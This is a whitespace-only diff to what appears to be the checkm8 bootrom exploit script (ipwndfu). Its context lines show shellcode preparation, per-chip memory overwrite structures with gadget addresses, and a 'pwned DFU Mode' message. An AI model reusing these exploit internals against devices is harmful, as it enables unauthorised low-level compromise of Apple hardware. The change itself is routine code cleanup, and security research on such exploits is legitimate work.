@@ -279,7 +279,7 @@ def payload(cpid):
         PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
                 0x48806384, # 8 - PAYLOAD_PTR
     ]
-    t8004_handler = asm_thumb_trampoline(0x48806E00+1, 0x877C+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t8004)[8:]    
+    t8004_handler = asm_thumb_trampoline(0x48806E00+1, 0x877C+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t8004)[8:]
     t8004_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8004)
     assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
@@ -438,7 +438,7 @@ def all_exploit_configs():
   t8010_overwrite    = struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
   t8011_overwrite    = struct.pack('<32x2Q', t8011_nop_gadget, 0x1800B0800)
   t8015_overwrite    = struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
-  
+
   s5l8947x_overwrite_offset = 0x660
   s5l895xx_overwrite_offset = 0x640
   t800x_overwrite_offset    = 0x5C0
@@ -528,3 +528,4 @@ def exploit():
   print 'Device is now in pwned DFU Mode.'
   print '(%0.2f seconds)' % (time.time() - start)
   dfu.release_device(device)
+
